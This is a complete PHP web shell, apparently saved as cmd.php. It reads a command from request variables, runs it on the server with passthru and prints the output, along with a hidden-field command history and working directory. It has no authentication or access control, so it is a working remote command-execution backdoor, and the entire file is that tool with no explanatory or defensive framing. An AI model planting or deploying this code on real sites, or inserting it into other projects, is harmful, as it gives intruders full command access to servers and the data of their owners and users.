<html>
<?php
	set_time_limit( 99999 );
	echo "<style type=\"text/css\">@import url(\"/DashBoard/fixed.css\");</style>";
	import_request_variables('G');
	import_request_variables('P');
	$home = getcwd();
	if( IsSet( $cwd ) && strlen( $cwd ) )
		chdir( $cwd );

	if( strlen( $history ) > 1024 )
		$history = substr( $history, 1024 );

	$history .= $cmd."<br />";
	if( $cmd == "cd" )
	{
		$cwd = $home;
		echo "cd to ".$cwd;
	}
	else
		if( substr( $cmd, 0, 3 ) == "cd " )
		{
			if( strlen( $cmd ) > 3 )
				$cwd = getcwd().'/'.substr( $cmd, 3 );
			else
				$cwd = $home;
			echo "cd to ".$cwd;
		}
		else
		{
			ob_start();
			passthru( $cmd." 2>&1" );
			$var = ob_get_contents();
			ob_end_clean();
		}

	echo $history;
?>
<form ACTION="cmd.php"METHOD=POST>
<?php echo $cwd ?> >
<input name="cmd" value="">
<input type="hidden" value="<? echo $cwd?>" name="cwd">
<input type="hidden" value="<? echo $history?>" name="history">
<input type="submit" value="Run" name="Run">
</form>
<br />
<div class="bodytext"><code>
<?php
	if( IsSet( $var ) )
		echo nl2br( $var );
?>
</code>
</div>
</html>
